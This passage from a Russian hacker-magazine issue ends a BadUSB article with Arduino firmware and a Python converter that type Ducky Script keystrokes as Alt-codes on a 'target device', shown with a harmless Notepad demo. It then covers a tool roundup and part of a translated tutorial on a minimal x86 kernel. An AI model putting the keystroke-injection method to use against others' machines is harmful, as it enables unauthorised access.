      используются в системе, сколько их, в каком порядке они стоят и каким
       сочетанием клавиш переключаются. Это явно не самый рациональный метод.
       Я предлагаю использовать другой вариант — вводить все символы
      при помощи Alt‐кодов. Этот способ в Windows иногда используется для ввода
      символов, которые отсутству ют на клавиату ре. Например, зажимаешь  Alt,
      удерживая, набираешь на цифровом блоке 9731, и получается сне говик. Здо‐
      рово? Нам это тоже очень поможет, поскольку таким образом можно вводить
      и обычные символы, причем независимо от текущей рас кладки.





                               Таб лица Alt‐кодов

      Для своих экспериментов я использовал Rubber Ducky на основе AT‐
      mega32U4. В первую очередь нужно научить ее вос производить команды —
       это делается на специальном языке, который называ ется Ducky Script. Одна‐
        ко, изучив материалы, я не нашел никаких сведений о воз можнос ти эмуляции
       клавиш циф рового блока. Поэтому сна чала нужно было модифицировать
      прошивку BadUSB.


     НОВАЯ ПРОШИВКА BADUSB
      За основу берем библиотеку keyboard. У меня получился вот такой код.


       #include "Keyboard.h"
       #include <SD.h>
       #include <string.h>
       #include <SPI.h>
       File script;
       boolean first = true;
       String DEFAULT_FILE_NAME = "script.txt";
       void setup() {
        if (!SD.begin(4)) {
           return;
        }
        script = SD.open(DEFAULT_FILE_NAME);
        if (script) {
           Keyboard.begin();
           String line = "";
           while (script.available()) {
            char m = script.read();
            if (m == '\n'){
              Line(line);
              line = "";
              }
              else if((int) m != 13)
              {
                line += m;
              }
           }
           Line(line);
           script.close();
        } else {
        }
        Keyboard.end();
       }
       void Line(String l)
       {
        int space_1 = l.indexOf(" ");
        if (space_1 == ‐1)
        {
           Press(l);
        }
        else if (l.substring(0,space_1) == "STRING")
        {
           Keyboard.print(l.substring(space_1 + 1));
        }
        else if (l.substring(0,space_1) == "DELAY")
        {
           int delaytime = l.substring(space_1 + 1).toInt();
           delay(delaytime);
        }
        else if(l.substring(0,space_1) == "REM"){}
        else
        {
            String remain = l;
            while(remain.length() > 0)
            {
              int latest_space = remain.indexOf(" ");
              if (latest_space == ‐1)
              {
                Press(remain);
                remain = "";
              }
              else
              {
                Press(remain.substring(0, latest_space));
                remain = remain.substring(latest_space + 1);
              }
              delay(5);
            }
        }
        Keyboard.releaseAll();
       }
       void Press(String b)
       {
        if(b.length() == 1)
        {
           char c = b[0];
           Keyboard.press(c);
        }
        else if (b.equals("ENTER"))
        {
           Keyboard.press(KEY_RETURN);
        }
        else if (b.equals("CTRL"))
        {
           Keyboard.press(KEY_LEFT_CTRL);
        }
           else if (b.equals("SHIFT"))
        {
           Keyboard.press(KEY_LEFT_SHIFT);
        }
           else if (b.equals("ALT"))
        {
           Keyboard.press(KEY_LEFT_ALT);
        }
           else if (b.equals("GUI"))
        {
           Keyboard.press(KEY_LEFT_GUI);
        }
        else if (b.equals("NUMLOCK"))
        {
           Keyboard.press(219);
        }
           else if (b.equals("UP") || b.equals("UPARROW"))
        {
           Keyboard.press(KEY_UP_ARROW);
        }
           else if (b.equals("DOWN") || b.equals("DOWNARROW"))
        {
           Keyboard.press(KEY_DOWN_ARROW);
        }
           else if (b.equals("LEFT") || b.equals("LEFTARROW"))
        {
           Keyboard.press(KEY_LEFT_ARROW);
        }
           else if (b.equals("RIGHT") || b.equals("RIGHTARROW"))
        {
           Keyboard.press(KEY_RIGHT_ARROW);
        }
           else if (b.equals("DELETE"))
        {
           Keyboard.press(KEY_DELETE);
        }
           else if (b.equals("PAGEUP"))
        {
           Keyboard.press(KEY_PAGE_UP);
        }
           else if (b.equals("PAGEDOWN"))
        {
           Keyboard.press(KEY_PAGE_DOWN);
        }
           else if (b.equals("HOME"))
        {
           Keyboard.press(KEY_HOME);
        }
           else if (b.equals("ESC"))
        {
           Keyboard.press(KEY_ESC);
        }
           else if (b.equals("INSERT"))
        {
           Keyboard.press(KEY_INSERT);
        }
           else if (b.equals("TAB"))
        {
           Keyboard.press(KEY_TAB);
        }
           else if (b.equals("END"))
        {
           Keyboard.press(KEY_END);
        }
           else if (b.equals("CAPSLOCK"))
        {
           Keyboard.press(KEY_CAPS_LOCK);
        }
           else if (b.equals("F1"))
        {
           Keyboard.press(KEY_F1);
        }
           else if (b.equals("F2"))
        {
           Keyboard.press(KEY_F2);
        }
           else if (b.equals("F3"))
        {
           Keyboard.press(KEY_F3);
        }
           else if (b.equals("F4"))
        {
           Keyboard.press(KEY_F4);
        }
           else if (b.equals("F5"))
        {
           Keyboard.press(KEY_F5);
        }
           else if (b.equals("F6"))
        {
           Keyboard.press(KEY_F6);
        }
           else if (b.equals("F7"))
        {
           Keyboard.press(KEY_F7);
        }
           else if (b.equals("F8"))
        {
           Keyboard.press(KEY_F8);
        }
           else if (b.equals("F9"))
        {
           Keyboard.press(KEY_F9);
        }
           else if (b.equals("F10"))
        {
           Keyboard.press(KEY_F10);
        }
           else if (b.equals("F11"))
        {
           Keyboard.press(KEY_F11);
        }
           else if (b.equals("F12"))
        {
           Keyboard.press(KEY_F12);
        }
           else if (b.equals("N9"))
        {
           Keyboard.press (233);
           Keyboard.release (233);
        }
           else if (b.equals("N8"))
        {
           Keyboard.press (232);
           Keyboard.release (232);
        }
           else if (b.equals("N7"))
        {
           Keyboard.press (231);
           Keyboard.release (231);
        }
           else if (b.equals("N6"))
        {
           Keyboard.press (230);
           Keyboard.release (230);
        }
           else if (b.equals("N5"))
        {
           Keyboard.press (229);
           Keyboard.release (229);
        }
           else if (b.equals("N4"))
        {
           Keyboard.press (228);
           Keyboard.release (228);
        }
           else if (b.equals("N3"))
        {
           Keyboard.press (227);
           Keyboard.release (227);
        }
           else if (b.equals("N2"))
        {
           Keyboard.press (226);
           Keyboard.release (226);
        }
           else if (b.equals("N1"))
        {
           Keyboard.press (225);
           Keyboard.release (225);
        }
           else if (b.equals("N0"))
        {
           Keyboard.press (234);
           Keyboard.release (234);
        }
       }
       void loop() {}

      Работать микроконтрол лер должен так же, как Rubber Duck, но с поддержкой
     цифрового блока. Все команды совпадают с Ducky Script, кроме одной. Если
       написать N и цифру (без разделителей), то будет эмулироваться нажатие кла‐
      виш на Numpad.


     КОНВЕРТЕР СТРОК
      Теоретически уже на этом этапе мож но начинать писать скрипты, но вручную
      вбивать альт‐коды — не лучший способ потратить свое время. Чтобы
       облегчить себе задачу, напишем небольшой скрипт на Python 3, который
       будет преобразовывать текст на английском в нажатия комбинаций с Alt.


       convert = {
         'A': 'ALT N6 N5',
         'B': 'ALT N6 N6',
         'C': 'ALT N6 N7',
         'D': 'ALT N6 N8',
         'E': 'ALT N6 N9',
         'F': 'ALT N7 N0',
         'G': 'ALT N7 N1',
         'H': 'ALT N7 N2',
         'I': 'ALT N7 N3',
         'J': 'ALT N7 N4',
         'K': 'ALT N7 N5',
         'L': 'ALT N7 N6',
         'M': 'ALT N7 N7',
         'N': 'ALT N7 N8',
         'O': 'ALT N7 N9',
         'P': 'ALT N8 N0',
         'Q': 'ALT N8 N1',
         'R': 'ALT N8 N2',
         'S': 'ALT N8 N3',
         'T': 'ALT N8 N4',
         'U': 'ALT N8 N5',
         'V': 'ALT N8 N6',
         'W': 'ALT N8 N7',
         'X': 'ALT N8 N8',
         'Y': 'ALT N8 N9',
         'Z': 'ALT N9 N0',
         'a': 'ALT N9 N7',
         'b': 'ALT N9 N8',
         'c': 'ALT N9 N9',
         'd': 'ALT N1 N0 N0',
         'e': 'ALT N1 N0 N1',
         'f': 'ALT N1 N0 N2',
         'g': 'ALT N1 N0 N3',
         'h': 'ALT N1 N0 N4',
         'i': 'ALT N1 N0 N5',
         'j': 'ALT N1 N0 N6',
         'k': 'ALT N1 N0 N7',
         'l': 'ALT N1 N0 N8',
         'm': 'ALT N1 N0 N9',
         'n': 'ALT N1 N1 N0',
         'o': 'ALT N1 N1 N1',
         'p': 'ALT N1 N1 N2',
         'q': 'ALT N1 N1 N3',
         'r': 'ALT N1 N1 N4',
         's': 'ALT N1 N1 N5',
         't': 'ALT N1 N1 N6',
         'u': 'ALT N1 N1 N7',
         'v': 'ALT N1 N1 N8',
         'w': 'ALT N1 N1 N9',
         'x': 'ALT N1 N2 N0',
         'y': 'ALT N1 N2 N1',
         'z': 'ALT N1 N2 N2',
         ',': 'ALT N4 N4',
         '.': 'ALT N4 N6',
         '/': 'ALT N4 N7',
         '<': 'ALT N6 N0',
         '>': 'ALT N6 N2',
         '?': 'ALT N6 N3',
         ';': 'ALT N5 N9',
         ':': 'ALT N5 N8',
         '"': 'ALT N3 N4',
         '[': 'ALT N9 N1',
         ']': 'ALT N9 N3',
         '{': 'ALT N1 N2 N3',
         '}': 'ALT N1 N2 N5',}
       stEng = input("Введите текст для конвертирования на английском: ")
       i = 0
       f = 0
       otvet = []
       for k in stEng:
         try:
             print(convert[stEng[i]])
             i += 1
         except KeyError:
             print('STRING',k)
             i += 1


    РАСШИРЯЕМ ПАМЯТЬ
     Обрати внимание, что этот скрипт преобразует только строки, но не весь код
       целиком. Кстати, из‐за того, что каждый вводимый символ превращается
       в 12 символов, отдельные скрипты, которые раньше помещались в память
      микроконтроллера, теперь могут не помес титься, так что придется как‐нибудь
      выкручиваться.


                 INFO

                            ATmega32U4 располагает 32 Кбайт флеш‐памяти,
                               из которых 4 Кбайт использует ся для хранения
                                  загрузчика. Также у нее 2,5 Кбайт ОЗУ и 1 Кбайт
                          EEPROM.


       Arduino — штука довольно гибкая, и ее можно улучшить, в первую оче редь
       всякими дополнительными модулями. Если нужно увеличить память, то берем
       картридер microSD и подклю чаем его по интерфейсу SPI.





                     Схема подключения картридера к Arduino

     Далее нам нужно модифицировать скетч, который будет читать скрипт с SD‐
       карты. Постоянно переза ливать скетч в Arduino не нужно, можно просто
       залить их на карту. Файл со скриптом обязатель но дол жен называться
      script.txt.


     ИНСТРУКЦИЯ К ИСПОЛЬЗОВАНИЮ
      Вот как будет выглядеть скрипт, открывающий блокнот и вводящий в него
        текст.


       DELAY 500
       GUI r
       STRING notepad
       ENTER
       DELAY 500
       STRING Hello World!

     Далее нужно преобразовать все стро ки: в данном при мере она одна —
      STRING.
        Копируем текст «Hello World!» и вставляем в нашу программу на Python.
      Получившийся код выглядит так:


       DELAY 500
       GUI r
       STRING notepad
       ENTER
       DELAY 500
       ALT N7 N2
       ALT N1 N0 N1
       ALT N1 N0 N8
       ALT N1 N0 N8
       ALT N1 N1 N1
       STRING
       ALT N8 N7
       ALT N1 N1 N1
       ALT N1 N1 N4
       ALT N1 N0 N8
       ALT N1 N0 N0
       STRING !

       Есть небольшая вероятность, что на целевом устройстве может быть вык‐
      лючен Num Lock, поэтому стоит в конце кода написать NUMLOCK и продуб‐
       лировать программу.
        Пример кода с дублирова нием:


       DELAY 500
       GUI r // Активируем команду «Выполнить»
       ALT N1 N1 N0 // Если NumLock включен, то следующие программы
       сработают
       ALT N1 N1 N1
       ALT N1 N1 N6
       ALT N1 N0 N1
       ALT N1 N1 N2
       ALT N9 N7
       ALT N1 N0 N0 // Вводим «notepad»
       ENTER
       DELAY 500 // Ждем 0,5 с
       ALT N7 N2
       ALT N1 N0 N1
       ALT N1 N0 N8
       ALT N1 N0 N8
       ALT N1 N1 N1
       STRING
       ALT N8 N7
       ALT N1 N1 N1
       ALT N1 N1 N4
       ALT N1 N0 N8
       ALT N1 N0 N0
       STRING ! // Вводим в блокноте «Hello World!»
       NUMLOCK // Если Num Lock был выключен, то мы его включаем этой
       командой и снова вводим код
       ALT F4
       GUI r // Активируем команду «Выполнить»
       ALT N1 N1 N0
       ALT N1 N1 N1
       ALT N1 N1 N6
       ALT N1 N0 N1
       ALT N1 N1 N2
       ALT N9 N7
       ALT N1 N0 N0 // Вводим «notepad»
       ENTER
       DELAY 500 // Ждем 0,5 с
       ALT N7 N2
       ALT N1 N0 N1
       ALT N1 N0 N8
       ALT N1 N0 N8
       ALT N1 N1 N1
       STRING
       ALT N8 N7
       ALT N1 N1 N1
       ALT N1 N1 N4
       ALT N1 N0 N8
       ALT N1 N0 N0
       STRING ! // Вводим в блокноте «Hello World!»

      Теперь сохраняем этот скрипт в файл script.txt, записы ваем на SD‐карту,
       ставим ее в картридер устройства, устройство — в порт и нас лаждаемся
       результатом!



}
ТРЮКИ





                       Андрей Письменный
                         Шеф‐редактор
                           apismenny@gmail.com



      STRUCTURED TEXT TOOLS — ПОДБОРКА УТИЛИТ ДЛЯ
      ОБРАБОТКИ ДАННЫХ ИЗ КОМАНДНОЙ СТРОКИ1       Нужная крошечная утилитка для командной строки иногда способна
        сэкономить массу времени. Мы уже писали про утилиты jq и gron,
        которые помога ют спра виться с файлами в JSON, но на этот раз я
        покажу тебе целые залежи подоб ных программок, чтобы ты мог
        покопаться в них в свое удовольствие. Ну или как минимум положить
        ссылку в закладки до нас тупления нужного момента.





         Итак, Structured  text tools — это репозиторий на GitHub, автор
        которого кол лекционирует ссыл ки на ути литы для работы с раз ными
        типами данных из коман дной строки. По большей части это прог‐
       раммы для Unix‐подобных систем, но попадаются и библиотеки
        для Python.
         Список делится на восемь основных час тей: DSV (текстовые фай‐
       лы с разделителем типа CSV), XML и HTML, JSON, YAML и TOML, INI,
         логи, конфигурационные файлы и в качес тве бонуса — утилиты
        для работы с однофайловыми базами данных.
         К примеру, rows — отличное средство для конвертации таб лиц
       между разными текстовыми форматами; xsv — штука для преобра‐
        зования CSV (ста тистика, сортировка, манипуляция со столбцами);
            fx — утилита, которая поз воляет быс тро скормить файл JSON скрип‐
          ту на JS (можно однос трочнику);  tq — парсер HTML, который
        работает подоб но селекторам CSS.
        И да, ты правиль но подметил: многие из этих утилит носят наз‐
        вания из двух букв. Потому что автор каждой из них, конечно же, уве‐
         рен, что ты будешь поль зоваться именно его творением, причем так
        часто, что нажимать больше двух клавиш было бы утомительно.


      GOOGLE SHEETS VM — ВИРТУАЛЬНАЯ МАШИНА ВНУТРИ
      ЭЛЕКТРОННОЙ ТАБЛИЦЫ2      Я думаю, тебе хорошо извес тно о возможности выполнять скрипты
        в документах Microsoft Oﬃce и Google Drive. Но давай отвлечемся
         от злокозненных применений и посмотрим, как в электронных таб‐
        лицах Google можно смас терить прос тейшую виртуальную машину,
        которая будет исполнять прог раммы.





        Автор этого небольшого эксперимента, Брайан Стеффенс, опуб‐
        ликовал пост в своем блоге и при вел исчерпывающую инс трукцию.
         Первым делом тебе понадобится открыть его документ и ско‐
        пировать к себе — ина че скрипты не заработают. А еще нужно дож‐
        даться, пока появится вкладка Computer, а затем выслушать предуп‐
       реждения Google о том, что рас ширение — не из белого списка.


               WARNING

                               Google хоть и зануден, но прав: если акка‐
                                  унт тебе ценен, лучше не давать доступ
                              кому попало. Код расширения выглядит
                              безобид но, но нет никаких гарантий, что
                              он не изменится. Для подоб ных экспе‐
                            риментов лучше иметь отдельную учет ку.


       Виртуалка самая прос тая: она имеет четыре регистра общего наз‐
         начения, указатель на инструкцию и ука затель на стек. Под держи‐
        вается 12 инструкций: mov, сложение, вычитание, умножение, опе‐
        рации со стеком, безусловный и условный переходы, функции,
        вывод и останов.
           Когда программа будет готова, выбирай пункт Run, и увидишь,
         что в ячейке Output появился результат вычислений. Если захочешь
        что‐нибудь написать самос тоятельно, то для отладки пригодится
        пошаговое исполнение (Step), а если будет интересно, как все
        это работает, открывай Script editor и смотри. Скрипт нес ложный —
         чуть меньше 500 строк.


       OUTLINE — ЛИЧНЫЙ СЕРВЕР VPN, ПОЛУЧИВШИЙ
      ПОДДЕРЖКУ GOOGLE3   VPN приобре тает все большую популярность — он не только поз‐
        воляет  обходить  региональные  огра ничения,  но  и  повышает
        безопасность, особенно если выбирать не первого попавшегося
        провайдера. Надежнее всего — уста новить VPN на свой сервер
        и ходить в интернет через него. К Google (вернее, Alphabet) недавно
       примкнул небольшой стартап Jigsaw, цель которого — сделать этот
        процесс максимально простым и дос тупным.
            Outline состоит из двух частей — той, что устанавливается на сер‐
         вер, и клиента, который позволяет управлять этими серверами (и
        потому называется «менеджер»). При пер вом запус ке менеджер
        предложит выбор: соз дать новую учет ную запись на DigitalOcean
        и автоматически залить сервер туда (по дороге выдают кредит
        в десять дол ларов при первой привязке карты) либо установить
        на другую пло щадку. Во вто ром случае тебе будет пре дос тавлена
        команда, которая скачивает и запус кает инстал ляционный скрипт.
       По завершении процесса ты получишь строку с настрой ками —
        копируй ее обратно в менеджер.





       Для работы сервера Outline понадобится Docker. Собственно, сер‐
        верная часть — это кон тейнер с предварительно нас троенным прок‐
        си Shadowsocks. Скрипт сам скачает все необходимое и поднимет
        сервер. Или не поднимет, если ты, как и я, запамятуешь, что твоя
       машина работает на ARM64 (такие задешево дают в Scaleway). Соб‐
        ранные под x86 контейнеры на нем, конечно же, не заводятся.
        В общем, если с Outline у тебя тоже не сложится, то остается
       еще масса других вариантов. Например, штука под названием Algo
        при помощи Ansible раз вернет VPN на свежем инстансе без всяких
        контейнеров.
         Или же можешь поставить OpenVPN своими руками, не полагаясь
        на автоматику. У нас, кста ти, было интерес ное руководство о том,
          как, добавив к нему stunnel, можно получить еще и защиту от глу‐
        бокой инспекции пакетов.
КОДИНГ

 ДАВАЙ НАПИШЕМ

ЯДРО





 СОЗДАЕМ ПРОСТЕЙШЕЕ РАБОЧЕЕ ЯДРО
      ОПЕРАЦИОННОЙ СИСТЕМЫ




Разработка  ядра  по  пра ву  считается
задачей не из легких, но написать простей‐
шее ядро может каждый. Чтобы прикоснуть‐
ся к магии кернел‐хакин га, нужно лишь соб‐
люсти некоторые условности и совладать        Арджун Сридхаран
с ассемблером. В этой статье мы на паль‐
цах разберем, как это сделать.





             INFO

                      Это перевод двух статей Арджуна Сридхарана:
                         •Kernel 101 — Let’s write a Kernel и
                         •Kernel 201 — Let’s write a Kernel with keyboard
                        and screen support.

                     Публикуется  с  разрешения  автора.  Перевел
                      Андрей Письменный.


Привет, мир!
  Давай напишем ядро, которое будет заг ружаться через GRUB на сис‐
темах, совместимых с x86. Наше первое ядро будет показывать сообщение
на экране и на этом останавливаться.


КАК ЗАГРУЖАЮТСЯ X86-МАШИНЫ
Прежде чем думать о том, как писать ядро, давай посмотрим, как компьютер
загружается и передает управление ядру. Большинс тво регистров процес‐
сора x86 имеют определенные значения пос ле загрузки. Регистр — указатель
на инструкцию (EIP) содержит адрес инс трукции, которая будет исполне на
процессором. Его захардкоженное значение — это 0xFFFFFFF0. То есть x86‐
й процессор всегда будет начинать исполнение с физического адре‐
са 0xFFFFFFF0. Это последние 16 байт 32‐разрядного адресного прос транс‐
тва. Этот адрес называется «вектор сброса» (reset vector).
  В  карте  памяти,  которая  содержится  в  чипсете,  прописано,  что
адрес 0xFFFFFFF0 ссылается на определен ную часть BIOS, а не на оператив‐
ную память. Однако BIOS копирует себя в оперативку для более быстрого
доступа — этот процесс называется «шедоуинг» (shadowing), создание
теневой копии. Так что адрес 0xFFFFFFF0 будет содержать только инс трукцию
перехода к тому месту в памяти, куда BIOS скопировала себя.
   Итак, BIOS начинает исполняться. Сначала она ищет устройства, с которых
можно загружаться в том порядке, который задан в нас тройках. Она проверя‐
ет носители на наличие «волшебного числа», которое отличает загрузочные
диски от обычных: если байты 511 и 512 в первом секторе равны 0xAA55, зна‐
чит, диск загрузоч ный.
   Как только BIOS найдет заг рузочное устрой ство, она скопирует содер‐
жимое первого сектора в оперативную память, начиная с адре са 0x7C00,
а затем переведет исполнение на этот адрес и начнет исполнение того кода,
который только что загрузила. Вот этот код и называется загрузчиком
(bootloader).
   Загрузчик загружает ядро по физическому адресу 0x100000. Именно он
и используется боль шинством популярных ядер для x86.
  Все процессоры, совместимые с x86, начинают свою работу в примитив‐
ном 16‐разрядном режиме, которые называ ют «реальным режимом» (real
mode). Загрузчик GRUB переключа ет про цес сор в 32‐разрядный защищен‐
ный режим (protected mode), переводя нижний бит регистра CR0 в единицу.
Поэтому ядро начинает загружаться уже в 32‐битном защищенном режиме.
  Заметь, что GRUB в слу чае с ядрами Linux выбирает соответствующий
протокол загрузки и загружает ядро в реальном режиме. Ядра Linux сами
переключаются в защищенный режим.


ЧТО НАМ ПОНАДОБИТСЯ
 • Компьютер, совместимый с x86 (очевидно),
 • Linux,
 • ассемблер NASM,
 • GCC,
 • ld (GNU Linker),
 • GRUB.


        WWW

                     Ты можешь найти исходный код того, что у нас
                      должно  получиться,  в  репозитории  автора
                       на GitHub.



ВХОДНАЯ ТОЧКА НА АССЕМБЛЕРЕ
Нам бы, конечно, хотелось написать все на C, но совсем избе жать исполь‐
зования ассемблера не получится. Мы напишем на ассемблере x86 неболь‐
шой файл, который станет стартовой точкой для нашего ядра. Все, что будет
делать ассемблерный код, — это вызывать внешнюю функцию, которую мы
напишем на C, а потом оста навливать выполнение программы.
   Как  сделать  так,  чтобы ассемблерный  код  стал  стартовой  точкой
для нашего ядра? Мы используем скрипт для компоновщика (linker), который
линкует объектные файлы и соз дает финальный исполняемый файл ядра
(подробнее объясню чуть ниже). В этом скрипте мы напрямую укажем, что
хотим, чтобы наш бинарный файл загружался по адресу 0x100000. Это адрес,
как я уже писал, по которому загрузчик ожидает уви деть входную точку в ядро.
   Вот код на ассемблере.


kernel.asm
bits 32
section .text
global start
extern kmain
start:
  cli
  mov esp, stack_space
  call kmain
  hlt
section .bss
resb 8192
stack_space:

Первая инструкция bits 32 — это не ассемблер x86, а директива NASM,
сообщающая, что нужно генерировать код для процес сора, который будет
работать в 32‐разрядном режиме. Для нашего примера это не обязательно,
но указывать это явно — хорошая практика.
   Вторая строка начинает текстовую секцию, также извес тную как секция
кода. Сюда пойдет весь наш код.
   global — это еще одна директива NASM, она объ являет символы
из нашего кода глобальными. Это позволит компоновщику найти символ
start, который и служит нашей точкой входа.
   kmain — это функция, которая будет определена в нашем фай ле kernel.
c. extern объявляет, что функция декларирована где‐то еще.
  Далее идет функция start, которая вызыва ет kmain и останавливает про‐
цессор инструкцией hlt. Прерывания могут будить процес сор после hlt, так
что сначала мы отклю чаем прерывания инструкцией cli (clear interrupts).
  В идеале мы дол жны выделить какое‐то количество памяти под стек и нап‐
равить на нее указатель стека (esp). GRUB, кажется, это и так делает за нас,
и на этот момент указатель стека уже задан. Однако на всякий случай
выделим немного памяти в секции BSS и направим указатель стека на ее
начало. Мы используем инструкцию resb — она резервирует память, задан‐
ную в байтах. Затем оставляется метка, указывающая на край зарезер‐
вированного куска памяти. Прямо перед вызовом kmain указатель стека (esp)
направляется на эту область инструкцией mov.


ЯДРО НА C
В файле kernel.asm мы вызвали функцию kmain(). Так что в коде на C
исполнение начнется с нее.


kernel.c
void kmain(void)
{
    const char *str = "my first kernel";
    char *vidptr = (char*)0xb8000;
    unsigned int i = 0;
    unsigned int j = 0;
    while(j < 80 * 25 * 2) {
        vidptr[j] = ' ';
        vidptr[j+1] = 0x07;
        j = j + 2;
    }
    j = 0;
    while(str[j] != '\0') {
        vidptr[i] = str[j];
        vidptr[i+1] = 0x07;
        ++j;
        i = i + 2;
    }
    return;
}

Все, что будет делать наше ядро, — очищать экран и выводить строку my ﬁrst
kernel.
  Первым  делом  мы  соз даем  ука затель   vidptr,  который  указывает
на адрес 0xb8000. В защищенном режиме это начало видеопамяти. Тексто‐
вая  экранная  память —  это  прос то  часть  адресного  пространс тва.
Под экранный ввод‐вывод выделен участок памяти, который начинается
с адреса 0xb8000, — в него помещается 25 строк по 80 символов ASCII.
  Каждый символ в тексто вой памяти представлен 16 битами (2 байта),
а не 8 битами (1 байтом), к которым мы привыкли. Первый байт — это код
символа в ASCII, а вто рой байт — это attribute‐byte. Это определение
формата символа, в том числе — его цвет.
   Чтобы вывести символ s зеленым по черному, нам нужно поместить s
в первый байт видеопамяти, а значение 0x02 — во второй байт. 0 здесь озна‐
чает черный фон, а 2 — зеленый цвет. Мы будем использовать светло‐серый
цвет, его код — 0x07.
  В первом цикле while программа запол няет пустыми символами с атри‐
бутом 0x07 все 25 строк по 80 символов. Это очис тит экран.
  Во втором цик ле while символы строки my ﬁrst kernel, оканчивающейся
нулевым символом, записываются в видеопа мять и каждый символ получает
attribute‐byte, равный 0x07. Это должно при вести к выводу строки.


КОМПОНОВКА
Теперь мы должны собрать kernel.asm в объектный файл с помощью NASM,
а затем при помощи GCC скомпилировать kernel.c в другой объектный файл.
Наша задача — слинковать эти объекты в исполняемое ядро, пригодное
к загрузке. Для этого потребуется написать для компоновщика (ld) скрипт,
который мы будем переда вать в качестве аргу мента.


link.ld
OUTPUT_FORMAT(elf32‐i386)
ENTRY(start)
SECTIONS
 {
   . = 0x100000;
   .text : { *(.text) }
   .data : { *(.data) }
   .bss  : { *(.bss)  }
 }

Здесь мы сначала задаем формат (OUTPUT_FORMAT) нашего исполня емого
файла как 32‐битный ELF  (Executable and Linkable Format), стандартный
бинарный формат для Unix‐образных систем для архитектуры x86.
   ENTRY принимает один аргу мент. Он задает наз вание символа, который
будет служить входной точкой исполня емого фай ла.
   SECTIONS — это самая важ ная для нас часть. Здесь мы определяем рас‐
кладку нашего исполняемого файла. Мы можем определить, как разные сек‐
ции будут объединены и куда каждая из них будет помещена.
  В фигурных скоб ках, которые идут за выражением SECTIONS, точка озна‐
чает счетчик позиции (location counter). Он автомати чески ини циализиру ется
значением 0x0 в начале бло ка SECTIONS, но его можно менять, назначая
новое значение.
  Ранее я уже писал, что код ядра должен начинаться по адресу 0x100000.
Именно поэтому мы и присваиваем счетчику позиции значение 0x100000.
   Взгляни на строку .text : { *(.text) }. Звездочкой здесь задается
маска, под которую подходит любое наз вание файла. Соответственно,
выражение *(.text) озна чает все входные секции .text во всех входных
файлах.
  В результате компоновщик сольет все тексто вые секции всех объектных
файлов в текстовую секцию исполня емого файла и раз местит по адре су, ука‐
занному в счетчике позиции. Секция кода нашего исполня емого файла будет
начинаться по адресу 0x100000.
  После того как компоновщик выдаст текстовую секцию, значение счетчика
позиции будет 0x100000 плюс размер текстовой секции. Точно так же секции
data и bss будут слиты и помещены по адресу, который задан счетчиком
позиции.


GRUB И МУЛЬТИЗАГРУЗКА
Теперь все наши файлы готовы к сборке ядра. Но поскольку мы будем заг‐
ружать ядро при помощи GRUB, оста ется еще один шаг.
  Существует стандарт для загрузки раз ных ядер x86 с помощью бутлоаде‐
ра. Это называется «спецификация мультибута». GRUB будет загружать толь‐
ко те ядра, которые ей соответствуют.
  В соответствии с этой спецификацией ядро может содержать заголовок
(Multiboot header) в первых 8 килобайтах. В этом заголовке должно быть про‐
писано три поля:
 • magic — содержит «вол шебное» число 0x1BADB002, по которому иден‐
   тифицируется заголо вок;
 • flags — это поле для нас не важно, можно оставить ноль;
 • checksum — контрольная сумма, должна дать ноль, если прибавить ее
   к полям magic и flags.

Наш файл kernel.asm теперь будет выглядеть следующим образом.



kernel.asm
bits 32
section .text
        ;multiboot spec
        align 4
        dd 0x1BADB002            ;magic
        dd 0x00                  ;flags
        dd ‐ (0x1BADB002 + 0x00) ;checksum
global start
extern kmain
start:
  cli
  mov esp, stack_space
  call kmain
  hlt
section .bss
resb 8192
stack_space:

Инструкция dd задает двойное сло во раз мером 4 байта.


СОБИРАЕМ ЯДРО
Итак, все готово для того, чтобы создать объектный файл из kernel.asm и ker‐
nel.c и слинковать их с применением нашего скрипта. Пишем в консоли:


$ nasm ‐f elf32 kernel.asm ‐o kasm.o

По этой команде ассемблер создаст файл kasm.o в формате ELF‐32  bit.
Теперь настал черед GCC:


$ gcc ‐m32 ‐c kernel.c ‐o kc.o

Параметр ‐c указывает на то, что файл после компиляции не нужно лин‐
ковать. Мы это сделаем сами:


$ ld ‐m elf_i386 ‐T link.ld ‐o kernel kasm.o kc.o

Эта команда запустит компоновщик с нашим скриптом и сге нерирует
исполняемый файл под наз ванием kernel.


           WARNING

                      Хакин гом ядра лучше все го заниматься в вир‐
                         туалке. Чтобы запустить ядро в QEMU вместо
                    GRUB, используй команду qemu‐system‐i386
                   ‐kernel kernel.





                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ
  ДАВАЙ НАПИШЕМ ЯДРО
            СОЗДАЕМ ПРОСТЕЙШЕЕ РАБОЧЕЕ ЯДРО
                     ОПЕРАЦИОННОЙ СИСТЕМЫ





НАСТРАИВАЕМ GRUB И ЗАПУСКАЕМ ЯДРО
GRUB требует, чтобы название файла с ядром следовало конвенции kernel‐
<версия>. Так что переименовываем файл — я назову свой kernel‐701.
   Теперь кладем ядро в каталог /boot. На это понадобятся привиле гии
суперпользователя.
  В конфигурационный файл GRUB grub.cfg нуж но будет добавить что‐то
в таком роде:


title myKernel
    root (hd0,0)
    kernel /boot/kernel‐701 ro

Не забудь убрать директиву hiddenmenu, если она прописана.


GRUB 2
Чтобы запустить созданное нами ядро в GRUB 2, который по умол чанию пос‐
тавляется в новых дистрибутивах, твой конфиг должен выглядеть следующим
образом:


 menuentry 'kernel 701' {
     set root='hd0,msdos1'
     multiboot /boot/kernel‐701 ro
 }


Благодарю Рубена Лагуану за это дополнение.


Перезагружай компьютер, и ты должен будешь увидеть свое ядро в списке!
А выбрав его, ты увидишь ту самую стро ку.





Это и есть твое ядро!


        WWW

                           •wiki.osdev.org
                          •osdever.net
                          •Multiboot spec



ПИШЕМ ЯДРО С ПОДДЕРЖКОЙ КЛАВИАТУРЫ И ЭКРАНА
Мы закончили работу над минимальным ядром, которое загружается через
GRUB, работает в защищенном режиме и выводит на экран одну строку. Нас‐
тала пора расширить его и добавить драйвер клавиатуры, который будет
читать символы с клавиату ры и выводить их на экран.


        WWW

                     Полный исходный код ты можешь найти в репози‐
                       тории авто ра на GitHub.


Мы будем общаться с  устройствами ввода‐вывода через порты  вво‐
да‐вывода. По сути, они просто адреса на шине ввода‐вывода. Для операций
чтения и записи в них существуют специальные про цес сорные инструкции.


РАБОТА С ПОРТАМИ: ЧТЕНИЕ И ВЫВОД
read_port:
    mov edx, [esp + 4]
    in al, dx
    ret
write_port:
    mov   edx, [esp + 4]
    mov   al, [esp + 4 + 4]
    out   dx, al
    ret

Доступ к портам ввода‐вывода осуществляется при помощи инструкций in
